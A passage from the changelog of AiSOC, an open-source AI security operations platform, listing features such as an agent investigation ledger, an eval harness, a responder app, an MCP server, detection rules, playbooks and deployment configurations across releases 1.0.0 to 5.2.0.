#### Public demo on `tryaisoc.com`

- **Cloudflare Tunnel infra** (`infra/cloudflare/`) — `config.yml.example`,
  `tunnel.sh`, and a README explaining how to run the demo profile
  behind `tryaisoc.com` via `cloudflared`. Tunnel script reads
  `DOMAIN`, `TUNNEL_NAME`, `SUBDOMAINS`, `SKIP_DNS`, `SKIP_RUN` env
  vars; defaults publish apex + `api.`, `ws.`, `docs.` subdomains.
- **`pnpm demo:public` script** (`scripts/demo-public.sh`) — boots
  `docker-compose.demo.yml` (read-only demo profile with seeded
  incidents) via `pnpm aisoc:demo --no-open`, then brings up the
  Cloudflare Tunnel that maps `tryaisoc.com` → web (`:3000`),
  `api.tryaisoc.com` → api (`:8000`), `ws.tryaisoc.com` → realtime
  (`:4000`), and `docs.tryaisoc.com` → Docusaurus (`:3001`).
  Companion scripts: `pnpm demo:public:tunnel-only` (skip stack
  bring-up, just run the tunnel) and `pnpm demo:public:setup`
  (provision tunnel + DNS without running cloudflared, for
  `cloudflared service install` flows).
- **Public-host-agnostic web bundle** (`apps/web/next.config.js`,
  `apps/web/src/lib/api.ts`) — the Next.js client now emits
  same-origin relative paths (`/api/v1/...`, `/ws/...`) instead of
  `localhost:8000`-baked URLs, with server-side rewrites proxying
  to api/agents/realtime by Docker DNS name. The same image works
  on `localhost:3000`, behind Cloudflare Tunnel on `tryaisoc.com`,
  or behind any reverse proxy without a rebuild.
- **README "Try it live"** — top-of-README link to the public demo
  with a one-liner for hosting your own on a Cloudflare-managed
  domain.

---

## [5.2.0] — 2026-05-04

### Added

This release groups four areas of work: an append-only investigation
ledger, a public eval harness, a mobile responder PWA, and a hosted
demo profile. Details below.

#### Auditable agent — Investigation Ledger

- **Investigation Ledger** (`services/api/migrations/008_investigation_ledger.sql`,
  `services/api/app/models/investigation.py`,
  `services/agents/app/investigator/ledger.py`) — every prompt the agent
  emits, every tool call, every retrieved evidence shard, and every
  rationale is persisted as an append-only `investigation_step` row,
  scoped to a tenant + case.
- **Investigation Ledger UI** (`apps/web/src/components/cases/InvestigationLedger.tsx`)
  — replayable step-by-step view in the case workspace with prompt,
  response, and tool-call diffs.
- **`GET /api/v1/investigations/*` endpoints** (`services/api/app/api/v1/endpoints/investigations.py`)
  for listing, retrieving, and replaying ledger entries by case.
- **Investigator graph upgrades**
  (`services/agents/app/investigator/{orchestrator,recon_agent,forensic_agent,responder_agent,report_writer_agent,state}.py`)
  — every node now writes a ledger entry on entry and exit, including
  the structured input it received and the structured output it produced.

#### Public eval harness — Pillar-1 eval suite

- **200-incident synthetic dataset**
  (`services/agents/tests/eval_data/synthetic_incidents.json`) — 200
  deterministic, regenerable cases covering all 14 MITRE ATT&CK enterprise
  tactics across roughly the top 50 techniques. Generated by
  `scripts/generate_eval_incidents.py`.
- **Four eval gates** under `services/agents/tests/`:
  - `test_alert_reduction.py` — **real measurement**: 1 000 noisy alerts →
    ~250 incidents via 3-tier fusion, with explicit storm and
    near-duplicate handling
  - `test_mitre_accuracy.py` — **substrate self-consistency gate**:
    tactic-level accuracy / precision / recall / F1 between the
    hand-curated extractor and the dataset that was written to feed it
  - `test_investigation_completeness.py` — **substrate self-consistency
    gate**: evidence-keyword coverage on a templated report
  - `test_response_quality.py` — **substrate self-consistency gate**:
    5-criterion offline rubric on a templated response plan (action class,
    severity awareness, MITRE alignment, evidence grounding, actionability)
- **`scripts/run_evals.py`** — one-shot harness with `--json` and `--ci`
  output modes. Total runtime ~25 ms on a laptop. CI-gated on every
  commit via `.github/workflows/ci.yml`. Runs deterministic substrate code
  against synthetic incidents — does not call the live LLM agent.
- **Public eval harness page** (`apps/docs/docs/benchmark.md`,
  `apps/web/src/app/benchmark/page.tsx`,
  `apps/web/src/components/benchmark/`) — published numbers, full
  method, comparison to other AI SOC offerings, and explicit framing of
  which suites measure substrate self-consistency vs real behaviour.
  Linked from the README and the docs landing page.

#### Mobile responder — Responder PWA

- **Responder PWA** (`apps/web/src/app/(responder)/`,
  `apps/web/src/components/responder/`,
  `apps/web/src/components/pwa/`) — installable, offline-aware, push-
  enabled responder console for on-call analysts. Service worker at
  `apps/web/public/sw.js`, manifest at `apps/web/public/manifest.json`,
  offline shell at `apps/web/public/offline.html`.
- **Passkey authentication** (`services/api/app/models/responder.py`,
  `services/api/app/api/v1/endpoints/passkeys.py`,
  `apps/web/src/lib/responder/`) — WebAuthn registration and login for
  the Responder surface; FIDO2 platform authenticators only, no SMS
  fallback.
- **On-call schedule + handoff** (`services/api/app/models/responder.py`,
  `services/api/app/api/v1/endpoints/oncall.py`) — current responder per
  tenant, surfaced in the Responder home page and in alert pages on the
  desktop console.
- **Approvals workflow** (`services/api/app/api/v1/endpoints/approvals.py`)
  — long-lived approval requests for blast-radius-gated SOAR actions,
  approvable from the Responder PWA with hardware-attested passkey.
- **Web Push delivery** (`services/realtime/src/push.ts`,
  `services/api/app/api/v1/endpoints/push.py`) — VAPID-signed push
  notifications wired into the realtime gateway. Subscriptions persist
  per-device and follow the on-call rotation.
- **Migration** — `services/api/migrations/009_responder_pwa.sql`.

#### Ambient Copilot

- **Contextual actions** (`services/agents/app/api/contextual.py`,
  `apps/web/src/components/alerts/AlertDetailView.tsx`,
  `apps/web/src/components/cases/CaseWorkspace.tsx`,
  `apps/web/src/components/detections/RuleEditor.tsx`,
  `apps/web/src/components/playbooks/PlaybookEditor.tsx`) — the AI Copilot
  now reads the surface the analyst is standing on (alert / case / rule /
  playbook) and proposes the next two or three concrete actions with the
  correct payloads pre-filled. One click invokes the agent with the
  right tool.
- **Investigator graph awareness** — every contextual action is grounded
  in the same Investigation Ledger so the analyst sees, before clicking,
  which prompts and tool calls will be issued.

#### MCP server — first-class IDE / chat integration

- **`@aisoc/mcp`** (`services/mcp/`) — Model Context Protocol server
  exposing 11 AiSOC tools to Claude Desktop, Cursor, Cody, and Continue.
- **Discovery tools** — `aisoc_list_alerts`, `aisoc_list_cases`,
  `aisoc_query_detections`.
- **Deep-dive tools** — `aisoc_get_case`, `aisoc_get_investigation`,
  `aisoc_get_alert`.
- **Action / replay tools** — `aisoc_run_investigation`,
  `aisoc_replay_decision`, `aisoc_explain_step`, `aisoc_create_case`,
  `aisoc_assign_alert`. The replay set walks the Investigation Ledger
  step-by-step inside the IDE / chat.
- **Install command** — `npx -y @aisoc/mcp install --host claude --aisoc-url … --api-key …`.
- **Documentation** — `apps/docs/docs/integrations/mcp.md`,
  `services/mcp/README.md`.

#### Hosted demo — `pnpm aisoc:demo`

- **Slim demo profile** (`docker-compose.demo.yml`) — postgres + redis +
  kafka + api + agents + realtime + web. ClickHouse, OpenSearch, Neo4j,
  and Qdrant are gated behind compose profiles for production.
- **Prebuilt images** — `ghcr.io/beenuar/aisoc-{api,agents,realtime,web,…}`
  built and published by `.github/workflows/publish-images.yml` on every
  release tag.
- **One-shot orchestrator** (`scripts/aisoc-demo.ts`) — pulls images,
  brings up the stack, waits on healthchecks, seeds canonical demo data,
  kicks off an agent investigation against a seeded case, and opens the
  browser at `/cases/<uuid>` with the live ledger view selected.
- **Demo mode middleware** (`services/api/app/middleware/demo_mode.py`)
  — gates write operations, resets state every UTC midnight, and
  watermarks the UI as read-only. Tests at
  `services/api/tests/test_demo_mode.py`.
- **Target time-to-first-investigation:** roughly 3–5 minutes on a warm
  Docker daemon, depending on image cache state.
- **Cleanup** — `pnpm aisoc:demo:down` removes the volumes; logs at
  `pnpm aisoc:demo:logs`.

#### Deployment — one-click everywhere

- **Fly.io** (`infra/fly/`) — first-class config for `api`, `agents`,
  `realtime`, `web`. Deploys via `infra/fly/fly-demo-deploy.sh`,
  ~$14/mo for the whole stack.
- **Render** (`render.yaml`) — managed, sleep-on-idle
  config suitable for hobbyists and design partners.
- **Railway** (`infra/railway/railway.toml`) — pay-as-you-go PaaS.
- **Coolify** (`infra/coolify/README.md`) — self-hosted on your own VPS,
  reuses the existing `docker-compose.yml`.

#### Marketplace — content as code

- **~200 detection rules** in `detections/` covering MITRE ATT&CK
  Enterprise (cloud, identity, endpoint, network, application). Sigma
  format, with MITRE technique IDs in `tags`, fixtures under
  `detections/fixtures/`, and `detections/README.md` documenting the
  schema.
- **50+ response playbooks** in `playbooks/packs/v1/` — IAM, EDR,
  network, application, generic. JSON DSL with explicit decision trees,
  human-approval gates, and rollback steps. Schema in
  `playbooks/README.md`.
- **15 plugins** in `plugins/` — both Go and Python implementations for
  CrowdStrike, Splunk, Sentinel, AWS Security Hub, Okta, Cloudflare WAF,
  Defender, GuardDuty, Pagerduty, Slack, Teams, Jira, ServiceNow,
  VirusTotal, AbuseIPDB. Each ships with manifests, tests, and SDK
  helpers.
- **Marketplace index** (`marketplace/index.json`,
  `apps/web/public/marketplace/index.json`) — auto-generated by
  `scripts/build_marketplace.py` from the on-disk content tree.
- **Validation tooling** —
  - `scripts/validate_detections.py` (Sigma + MITRE ID schema)
  - `scripts/validate_playbooks.py` and `scripts/lint_playbooks.py`
    (DSL well-formedness + safety)
  - `.github/workflows/{validate-detections,validate-playbooks,sync-marketplace}.yml`
    enforce the gates on every PR.
- **In-app marketplace** (`apps/web/src/app/(app)/marketplace/page.tsx`,
  `apps/web/src/components/marketplace/MarketplaceView.tsx`) — filterable
  by category, ratings, verified vs community badge.

#### Plugin & client SDKs

- **`packages/plugin-sdk-go`** — Go plugin SDK
  (`module github.com/beenuar/aisoc/plugin-sdk-go`) with action,
  connector, enricher, registry, widget, and loader primitives.
  Examples under `packages/plugin-sdk-go/examples/`.
- **`packages/plugin-sdk-py`** — Python plugin SDK with the matching
  primitives, decorators, and a registry. Tests under
  `packages/plugin-sdk-py/tests/`.
- **`packages/sdk-py`** (PyPI: `aisoc-sdk`) — async Python client SDK
  for the AiSOC API.
- **`packages/sdk-ts`** (npm: `@aisoc/sdk`) — TypeScript client SDK
  with auto-generated types.
- **`packages/sdk-go`** — Go client SDK with OpenAPI-generated models.

#### Marketing & docs

- **`/why-open-source`** page (`apps/web/src/app/why-open-source/page.tsx`)
  — long-form description of the project's open-source posture and
  trade-offs.
- **Updated landing** (`apps/web/src/components/landing/{Hero,LandingNav,Footer,OpenSource}.tsx`)
  — the "live demo" button lands directly on a seeded investigation;
  comparison rows reference specific behaviours rather than generic
  claims.
- **Docusaurus refresh** — new MCP integration page, benchmark page,
  Investigation Ledger references, Responder PWA mentions in concepts
  and quickstart.

### Changed

- **Repository home** — all `cyble-inc/AiSOC` and `aisoc-os/aisoc` URLs
  updated to `beenuar/AiSOC` across docs, README, SDKs, and benchmark
  badges.
- **`packages/sdk-go` module path** is now `github.com/beenuar/aisoc/sdk-go`
  for the API client SDK; the plugin SDK is at
  `github.com/beenuar/aisoc/plugin-sdk-go`.
- **`alerts` API** (`services/api/app/api/v1/endpoints/alerts.py`,
  `services/api/app/models/alert.py`) — surfaces copilot context
  (suggested next actions) inline on the alert detail response.
- **API router** (`services/api/app/api/v1/router.py`) — wires up
  `approvals`, `investigations`, `marketplace`, `oncall`, `passkeys`,
  `push`.

### Fixed

- **CI Docker build contexts** — `.github/workflows/{ci,release,publish-images}.yml`
  now set explicit `context` and `file` parameters per service; multi-
  service builds no longer race on a stale build root.
- **Docker Compose obsolete `version` warning** — removed `version: '3.8'`
  from `docker-compose.demo.yml`.
- **Repository hygiene** — added `.gocache/`, `*.tsbuildinfo`,
  `apps/docs/.docusaurus/`, `apps/docs/build/`,
  `plugins/**/*-build-test`, `plugins/**/*-build`,
  `eval_report.json`, and `eval_mitre_accuracy_report.json` to
  `.gitignore`. Removed previously tracked Docusaurus cache and local
  IDE hook state files from the index.

---

## [5.1.0] — 2026-05-03

### Added

- **UEBA service** (`services/ueba`) — User & Entity Behavior Analytics
  - Welford online algorithm for incremental baseline computation
  - Z-score anomaly scoring with configurable sensitivity
  - Peer-group analysis (same role / department / location clustering)
  - Kafka consumer (`security.events`) → producer (`security.anomalies`) integration with `fusion` service
  - Alembic migrations, Dockerfile, Helm deployment template
- **Honeytokens service** (`services/honeytokens`) — deceptive credential & file traps
  - HMAC-SHA256 signed token generator (URL, file, AWS key, email flavors)
  - Webhook handler for first-touch alerting (HTTP signed callbacks)
  - Token lifecycle management: active / triggered / expired states
  - React UI: create tokens, view trigger log, copy lure URLs
  - Alembic migrations, Dockerfile, Helm deployment template
- **Purple Team service** (`services/purple-team`) — adversary emulation & tabletop
  - Atomic Red Team YAML parser (any `atomics/` directory)
  - Caldera REST integration for remote execution
  - ATT&CK coverage heatmap (tactic × technique matrix)
  - Test execution tracking with detection reporting (true positive / false negative)
  - Tabletop exercise session manager with finding capture
  - React UI: Coverage tab, Executions tab, Tabletop tab
  - Alembic migrations, Dockerfile, Helm deployment template

---

## [5.0.0] — 2026-05-03

### Added

- **SAML 2.0 + OIDC authentication** (`services/api/app/auth/`)
  - IdP-initiated and SP-initiated SAML 2.0 flows (python3-saml)
  - OIDC authorization-code + PKCE flow with `authlib`
  - JWT issuance on successful SSO login
- **Multi-tenant Row-Level Security** (Postgres RLS)
  - `tenant_id` column on all data tables
  - RLS policies enforced at the database level
  - SQLAlchemy `set_tenant()` middleware in FastAPI deps
- **Granular RBAC** (`services/api/app/api/v1/endpoints/rbac.py`)
  - `roles`, `role_permissions`, `user_roles` tables
  - `require_permission("resource:action")` FastAPI dependency
  - Admin UI at `/settings/rbac`
- **Immutable Audit Log**
  - Append-only `audit_log` table with a before-UPDATE trigger
  - FastAPI middleware auto-logs every mutating request
  - `GET /api/v1/audit` paginated endpoint with tenant filter
  - Audit log viewer UI at `/audit`
- **Compliance dashboards**
  - SOC 2 evidence auto-collection + PDF export (`/compliance/soc2`)
  - ISO 27001, NIST CSF, PCI-DSS, HIPAA, DORA framework heatmaps
  - `GET /api/v1/compliance/{framework}` endpoint with control mapping
- **SLA tracking** — MTTD / MTTR / MTTC
  - `tenant_sla_config` + `alert_sla_events` tables
  - `GET /api/v1/sla/metrics` + `GET /api/v1/sla/breaches`
  - SLA dashboard widget at `/sla`
- **HA Helm chart** — HPA, PDB, Ingress per service
- **Backup & restore scripts** (`scripts/backup.sh`, `scripts/restore.sh`) for Postgres + ClickHouse + plugins → S3/R2
- **Operational runbook generator** (`scripts/generate_runbook.py`) from live OTel trace data
- **Multi-region deployment guide** (`docs/operations/multi-region.md`)
- **OpenTelemetry instrumentation** across API, UEBA, Honeytokens, and Purple Team services

---

## [4.1.0] — 2026-05-03

### Added

- **AiSOC CLI** (`packages/aisoc-cli`) — `scaffold`, `validate`, `publish` commands for plugins and detections
  - `aisoc scaffold plugin <name>` — generate plugin skeleton
  - `aisoc validate detection <file>` — Sigma/YAML schema validation
  - `aisoc publish plugin <path>` — submit to community registry with Ed25519 signing
- **Plugin publishing flow**
  - `community_plugins` table with signature, author, review state
  - `POST /api/v1/plugins/publish` — signed submission
  - `POST /api/v1/plugins/{id}/approve` / `reject` — curator review endpoints
  - Ed25519 signature verification on every submission
- **Marketplace v2** — ratings, install counts, verified badges, category filter, sort options
  - `plugin_ratings` table + `POST /api/v1/plugins/{id}/rate`
  - `GET /api/v1/marketplace?category=&sort=` with pagination
- **Detection catalog** (`/detection/catalog`) — paginated Sigma rule browser
  - Install-to-tenant action from catalog
  - `GET /api/v1/detections/catalog` endpoint
- **Playbook community submissions**
  - `community_playbooks` table + submit / curate API
  - Community tab in PlaybooksView UI
- **Docusaurus documentation site** (`apps/docs`) — full API, architecture, deployment, plugin SDK, quickstart

---

## [3.0.0] — 2026-05-02

### Added
- **Threat Intelligence Enrichment (13 providers)**
  - Open-source/freemium: VirusTotal, AbuseIPDB, GreyNoise, Shodan, URLScan.io, IPinfo
  - Commercial: Cyble Vision, Recorded Future, Mandiant, Crowdstrike Intel, Anomali, IBM X-Force, Flashpoint, Intel 471, DomainTools, RiskIQ
  - New enrichment types: `DarkWebContext`, `VulnerabilityRef`, `BrandRisk`
  - Concurrent fan-out enrichment engine in Go
- **Go module path migration** — all services updated from `github.com/cyble/aisoc` to `github.com/beenuar/aisoc`
- **SECURITY.md** — vulnerability disclosure policy and security contacts
- `services/enrichment/README.md` — full enrichment service documentation

### Changed
- All GitHub repository references updated to `https://github.com/beenuar/AiSOC`
- Helm chart container images updated from `ghcr.io/cyble/aisoc-*` to `ghcr.io/beenuar/aisoc-*`
- `.env.example` expanded with API keys for all commercial TI providers

---

## [2.0.0] — 2026-05-01

### Added
- **Knowledge Graph** — Neo4j-backed entity relationship visualization (`services/api/app/services/graph_service.py`)
- **ML Fusion Engine** — multi-model alert scoring and deduplication (`services/fusion/app/services/`)
- **Rule Engine** — YAML-based detection rules with MITRE ATT&CK mapping (`services/api/app/services/rule_engine.py`)
- **Attack Graph** viz with D3.js force layout (`apps/web/src/components/graph/`)
- **MITRE ATT&CK Heatmap** on dashboard
- **AI Copilot dock** — streaming LLM assistant integrated into case and alert views
- **Threat Hunt page** — query builder with saved hunts and timeline scrubbing
- **Case Workspace** — full case lifecycle: evidence, timeline, collaborators, MITRE tagging
- **Detection Rule Builder** — visual rule editor with backtesting
- **Settings page** — RBAC, notifications, API key management, threat intel feed config
- **Live Dashboard** — WebSocket-powered real-time alert/event feed
- **Command Palette** (cmd-K) — fuzzy search for navigation and actions
- **Marketing Landing Page** — hero, feature highlights, open-source section, footer
- **Design Token System** — Tailwind + CSS vars, Framer Motion animations, responsive layouts
- **Demo Producer** — synthetic event generator for local development
- `scripts/seed_demo.py` — database seeding for demos

### Changed
- Web app migrated to Next.js App Router
- All API routes versioned under `/api/v1`

---

## [1.0.0] — 2026-04-30

### Added
- Initial release of AiSOC — AI Security Operations Center
- FastAPI backend (`services/api`) with alert ingestion, case management, detection rules
- Next.js 14 frontend (`apps/web`) with dashboard, alerts, cases, connectors, threat-intel pages
- Real-time service (`services/realtime`) using WebSockets
- Ingest service (`services/ingest`) in Go for high-throughput event ingestion
- Enrichment service (`services/enrichment`) in Go
- Docker Compose stack for local development
- Helm chart for Kubernetes deployment (`infra/helm/aisoc/`)
- MIT License

[Unreleased]: https://github.com/beenuar/AiSOC/compare/v9.0.0...HEAD
[9.0.0]: https://github.com/beenuar/AiSOC/compare/v8.1.1...v9.0.0
[8.1.1]: https://github.com/beenuar/AiSOC/compare/v8.1.0...v8.1.1
[8.1.0]: https://github.com/beenuar/AiSOC/compare/v8.0.0...v8.1.0
[8.0.0]: https://github.com/beenuar/AiSOC/compare/v7.7.0...v8.0.0
[5.2.0]: https://github.com/beenuar/AiSOC/compare/v5.1.0...v5.2.0
[5.1.0]: https://github.com/beenuar/AiSOC/compare/v5.0.0...v5.1.0
[5.0.0]: https://github.com/beenuar/AiSOC/compare/v4.1.0...v5.0.0
[4.1.0]: https://github.com/beenuar/AiSOC/compare/v3.0.0...v4.1.0
[3.0.0]: https://github.com/beenuar/AiSOC/compare/v2.0.0...v3.0.0
[2.0.0]: https://github.com/beenuar/AiSOC/compare/v1.0.0...v2.0.0
[1.0.0]: https://github.com/beenuar/AiSOC/releases/tag/v1.0.0
